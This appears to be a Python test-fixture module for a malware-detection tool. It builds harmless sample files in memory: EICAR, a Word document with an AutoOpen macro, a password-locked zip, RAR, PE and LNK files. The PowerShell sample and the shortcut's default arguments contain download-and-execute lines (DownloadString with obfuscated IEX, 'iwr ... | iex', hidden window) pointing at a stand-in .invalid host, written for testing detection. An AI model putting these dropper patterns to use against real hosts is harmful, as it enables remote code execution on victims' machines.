"""Harmless test files, built in memory. None of them contains real malware.

- eicar(): the standard antivirus test string (assembled from pieces, so this file doesn't look like it)
- docm(): a Word document with a macro that only shows a message box, set to run on opening (AutoOpen)
- obfuscated_ps1(): a scrambled PowerShell script shaped like a download-and-run line; the address
  ends in .invalid, a name that can never exist, and nothing here ever runs it
- lnk(): a shortcut that would start PowerShell hidden with a command
- zip_locked(): a zip locked with a password (traditional zip encryption)
- rar_stored(): a tiny RAR (version 4) archive with one uncompressed file
"""

import base64
import struct
import time
import zlib
from io import BytesIO
import zipfile


def eicar() -> bytes:
    return "".join(["X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-", "ANTIVIRUS-TEST-FILE!$H+H*"]).encode()


# ---------- PowerShell and shortcut ----------

def obfuscated_ps1() -> bytes:
    hidden = base64.b64encode("Write-Host 'Hello from a harmless Blotter test'".encode("utf-16-le")).decode()
    return (
        "# Harmless Blotter test script. It is never run; it only looks like what malware does.\r\n"
        "$u = 'https://blotter-test.invalid/hello.txt'\r\n"
        "$w = New-Object Net.WebClient\r\n"
        "$t = $w.DownloadString($u)\r\n"
        "I`E`X $t\r\n"
        f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {hidden}\r\n"
    ).encode("utf-8")


def plain_ps1() -> bytes:
    return b"# Lists the files in this folder.\r\nGet-ChildItem | Sort-Object Length | Format-Table Name, Length\r\n"


def lnk(target=r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        arguments="-w hidden -c iwr https://blotter-test.invalid/a | iex", minimized=True) -> bytes:
    flags = 0x08 | 0x20 | 0x80  # HasRelativePath, HasArguments, IsUnicode
    header = bytearray(0x4C)
    struct.pack_into("<I", header, 0, 0x4C)
    header[4:20] = bytes.fromhex("0114020000000000c000000000000046")
    struct.pack_into("<I", header, 0x14, flags)
    struct.pack_into("<I", header, 0x3C, 7 if minimized else 1)

    def string(s):
        return struct.pack("<H", len(s)) + s.encode("utf-16-le")

    return bytes(header) + string(target) + string(arguments)


# ---------- archives ----------

def zip_of(files: dict, compress=zipfile.ZIP_DEFLATED) -> bytes:
    out = BytesIO()
    with zipfile.ZipFile(out, "w", compress) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return out.getvalue()


_CRC_TABLE = []
for _n in range(256):
    _c = _n
    for _ in range(8):
        _c = (_c >> 1) ^ 0xEDB88320 if _c & 1 else _c >> 1
    _CRC_TABLE.append(_c)


def _zipcrypto(data: bytes, password: bytes, check_byte: int) -> bytes:
    keys = [0x12345678, 0x23456789, 0x34567890]

    def update(c):
        keys[0] = _CRC_TABLE[(keys[0] ^ c) & 0xFF] ^ (keys[0] >> 8)
        keys[1] = ((keys[1] + (keys[0] & 0xFF)) * 134775813 + 1) & 0xFFFFFFFF
        keys[2] = _CRC_TABLE[(keys[2] ^ (keys[1] >> 24)) & 0xFF] ^ (keys[2] >> 8)

    def stream_byte():
        t = (keys[2] | 2) & 0xFFFF
        return ((t * (t ^ 1)) >> 8) & 0xFF

    for c in password:
        update(c)
    out = bytearray()
    for p in bytes(11) + bytes([check_byte]) + data:
        out.append(p ^ stream_byte())
        update(p)
    return bytes(out)


def zip_locked(name: str, data: bytes, password=b"infected") -> bytes:
    """A stored (uncompressed) zip entry with traditional PKWARE encryption."""
    crc = zlib.crc32(data)
    body = _zipcrypto(data, password, crc >> 24)
    fname = name.encode()
    local = struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0x1, 0, 0, 0x21, crc, len(body), len(data), len(fname), 0)
    central = struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 0x1, 0, 0, 0x21, crc, len(body), len(data),
                          len(fname), 0, 0, 0, 0, 0x20, 0)
    blob = local + fname + body
    cd = central + fname
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, 1, 1, len(cd), len(blob), 0)
    return blob + cd + end


def rar_stored(name: str, data: bytes) -> bytes:
    def block(head_type, flags, rest):
        size = 7 + len(rest)
        body = struct.pack("<BHH", head_type, flags, size) + rest
        return struct.pack("<H", zlib.crc32(body) & 0xFFFF) + body

    marker = b"Rar!\x1a\x07\x00"
    main = block(0x73, 0, struct.pack("<HI", 0, 0))
    fname = name.encode()
    t = time.localtime(1760000000)
    dos_time = ((t.tm_year - 1980) << 25) | (t.tm_mon << 21) | (t.tm_mday << 16) | (t.tm_hour << 11) | (t.tm_min << 5)
    file_rest = struct.pack("<IIBIIBBHI", len(data), len(data), 2, zlib.crc32(data), dos_time, 29, 0x30,
                            len(fname), 0x20) + fname
    file_block = block(0x74, 0x8000, file_rest)
    end = block(0x7B, 0x4000, b"")
    return marker + main + file_block + data + end


# ---------- Word document with a macro ----------

def _ovba_compress(data: bytes) -> bytes:
    """MS-OVBA container: full 4096-byte pieces stored raw, the rest as literal-only compressed chunks."""
    out = bytearray(b"\x01")
    pos = 0
    while len(data) - pos >= 4096:
        out += struct.pack("<H", 0x3FFF) + data[pos:pos + 4096]
        pos += 4096
    rest = data[pos:]
    while rest:
        piece, rest = rest[:3600], rest[3600:]
        chunk = bytearray()
        for i in range(0, len(piece), 8):
            chunk.append(0)  # flag byte: next 8 tokens are literal bytes
            chunk += piece[i:i + 8]
        out += struct.pack("<H", 0xB000 | (len(chunk) + 2 - 3)) + chunk
    return bytes(out)


def _rec(rec_id, data=b""):
    return struct.pack("<HI", rec_id, len(data)) + data


def _dir_stream(module: str, stream: str, offset: int) -> bytes:
    name = b"VBAProject"
    d = b"".join([
        _rec(0x0001, struct.pack("<I", 1)),                 # PROJECTSYSKIND: 32-bit Windows
        _rec(0x0002, struct.pack("<I", 0x409)),             # PROJECTLCID
        _rec(0x0014, struct.pack("<I", 0x409)),             # PROJECTLCIDINVOKE
        _rec(0x0003, struct.pack("<H", 1252)),              # PROJECTCODEPAGE
        _rec(0x0004, name),                                 # PROJECTNAME
        _rec(0x0005), _rec(0x0040),                         # PROJECTDOCSTRING (+ unicode)
        _rec(0x0006), _rec(0x003D),                         # PROJECTHELPFILEPATH (+ second)
        _rec(0x0007, struct.pack("<I", 0)),                 # PROJECTHELPCONTEXT
        _rec(0x0008, struct.pack("<I", 0)),                 # PROJECTLIBFLAGS
        struct.pack("<HIIH", 0x0009, 4, 1, 0),              # PROJECTVERSION
        _rec(0x000C), _rec(0x003C),                         # PROJECTCONSTANTS (+ unicode)
        struct.pack("<HIH", 0x000F, 2, 1),                  # PROJECTMODULES: 1 module
        struct.pack("<HIH", 0x0013, 2, 0xFFFF),             # PROJECTCOOKIE
        _rec(0x0019, module.encode()),                      # MODULENAME
        _rec(0x0047, module.encode("utf-16-le")),           # MODULENAMEUNICODE
        _rec(0x001A, stream.encode()), _rec(0x0032, stream.encode("utf-16-le")),  # MODULESTREAMNAME
        _rec(0x001C), _rec(0x0048),                         # MODULEDOCSTRING
        _rec(0x0031, struct.pack("<I", offset)),            # MODULEOFFSET
        _rec(0x001E, struct.pack("<I", 0)),                 # MODULEHELPCONTEXT
        struct.pack("<HIH", 0x002C, 2, 0xFFFF),             # MODULECOOKIE
        struct.pack("<HI", 0x0021, 0),                      # MODULETYPE: procedural
        struct.pack("<HI", 0x002B, 0),                      # module terminator
        struct.pack("<HI", 0x0010, 0),                      # dir terminator
    ])
    return d + bytes(4096 - len(d))  # padded so the stream is stored in normal sectors


def _cfb(entries) -> bytes:
    """A small OLE compound file. entries: [(name, kind, data_or_None, child, right)] with entry 0 = root.
    Every stream must be at least 4096 bytes (so nothing needs the 'mini stream')."""
    sector = 512
    data_sectors, layout = [], []
    for name, kind, data, child, right in entries:
        if data is None:
            layout.append((None, 0))
            continue
        assert len(data) >= 4096
        start = len(data_sectors)
        padded = data + bytes(-len(data) % sector)
        data_sectors += [padded[i:i + sector] for i in range(0, len(padded), sector)]
        layout.append((start, len(data)))
    dir_count = -(-len(entries) // 4)
    fat_count = 1
    while (len(data_sectors) + dir_count + fat_count) > fat_count * 128:
        fat_count += 1
    total = len(data_sectors) + dir_count + fat_count
    fat = [0xFFFFFFFF] * (fat_count * 128)
    for (start, size) in layout:
        if start is None:
            continue
        n = -(-size // sector)
        for i in range(n):
            fat[start + i] = start + i + 1 if i < n - 1 else 0xFFFFFFFE
    dir_start = len(data_sectors)
    for i in range(dir_count):
        fat[dir_start + i] = dir_start + i + 1 if i < dir_count - 1 else 0xFFFFFFFE
    fat_start = dir_start + dir_count
    for i in range(fat_count):
        fat[fat_start + i] = 0xFFFFFFFD
    directory = bytearray()
    for (name, kind, data, child, right), (start, size) in zip(entries, layout):
        raw = name.encode("utf-16-le") + b"\x00\x00"
        directory += raw + bytes(64 - len(raw))
        directory += struct.pack("<HBB", len(raw), kind, 1)
        directory += struct.pack("<III", 0xFFFFFFFF, right, child)
        directory += bytes(16) + struct.pack("<I", 0) + bytes(16)
        first = 0xFFFFFFFE if start is None else start
        directory += struct.pack("<IQ", first, size)
    while len(directory) < dir_count * sector:
        empty = bytearray(128)
        struct.pack_into("<III", empty, 68, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF)
        directory += empty
    header = bytearray(512)
    header[0:8] = bytes.fromhex("d0cf11e0a1b11ae1")
    struct.pack_into("<HHHHH", header, 24, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<IIIIIIIII", header, 40, 0, fat_count, dir_start, 0, 4096, 0xFFFFFFFE, 0, 0xFFFFFFFE, 0)
    difat = [fat_start + i for i in range(fat_count)] + [0xFFFFFFFF] * (109 - fat_count)
    struct.pack_into("<109I", header, 76, *difat)
    body = b"".join(data_sectors) + bytes(directory) + struct.pack(f"<{len(fat)}I", *fat)
    assert len(body) == total * sector
    return bytes(header) + body


MACRO = ('Attribute VB_Name = "Module1"\r\n'
         'Sub AutoOpen()\r\n'
         '    MsgBox "Hello from a harmless Blotter test macro."\r\n'
         'End Sub\r\n')


def vba_project(source: str = MACRO, module: str = "Module1") -> bytes:
    offset = 4096
    module_stream = bytes(offset) + _ovba_compress(source.encode("latin-1"))
    module_stream += bytes(max(0, 4096 - len(module_stream)))
    project = (f'ID="{{00000000-0000-0000-0000-000000000000}}"\r\nModule={module}\r\nName="VBAProject"\r\n'
               'HelpContextID="0"\r\nVersionCompatible32="393222000"\r\n\r\n[Host Extender Info]\r\n'
               '&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000\r\n').encode()
    project += b"\r\n" * ((4096 - len(project)) // 2 + 1)
    vba_project_stream = struct.pack("<HHBH", 0x61CC, 0xFFFF, 0, 0) + bytes(4096)
    entries = [
        ("Root Entry", 5, None, 1, 0xFFFFFFFF),
        ("VBA", 1, None, 3, 2),
        ("PROJECT", 2, project, 0xFFFFFFFF, 0xFFFFFFFF),
        ("dir", 2, _ovba_compress(_dir_stream(module, module, offset)), 0xFFFFFFFF, 4),
        ("_VBA_PROJECT", 2, vba_project_stream, 0xFFFFFFFF, 5),
        (module, 2, module_stream, 0xFFFFFFFF, 0xFFFFFFFF),
    ]
    return _cfb(entries)


def docm(source: str = MACRO) -> bytes:
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
        'officeDocument" Target="word/document.xml"/></Relationships>')
    doc_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
        'Target="vbaProject.bin"/></Relationships>')
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>'
        '<w:t>Harmless Blotter test document.</w:t></w:r></w:p></w:body></w:document>')
    return zip_of({"[Content_Types].xml": content_types, "_rels/.rels": rels, "word/document.xml": document,
                   "word/_rels/document.xml.rels": doc_rels, "word/vbaProject.bin": vba_project(source)})


def remote_template_docx(url="https://blotter-test.invalid/template.dotm") -> bytes:
    settings_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
        f'attachedTemplate" Target="{url}" TargetMode="External"/></Relationships>')
    return zip_of({"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>",
                   "word/_rels/settings.xml.rels": settings_rels})


def minimal_pe(dll=False) -> bytes:
    """Just enough of a Windows program header for the file-type check (it would not run)."""
    mz = bytearray(0x80)
    mz[0:2] = b"MZ"
    struct.pack_into("<I", mz, 0x3C, 0x80)
    coff = struct.pack("<4sHHIIIHH", b"PE\0\0", 0x14C, 0, 0, 0, 0, 0xE0, 0x2102 if dll else 0x0102)
    optional = bytearray(0xE0)
    struct.pack_into("<H", optional, 0, 0x10B)
    struct.pack_into("<H", optional, 68, 2)  # subsystem: Windows GUI
    return bytes(mz) + coff + bytes(optional) + bytes(512)
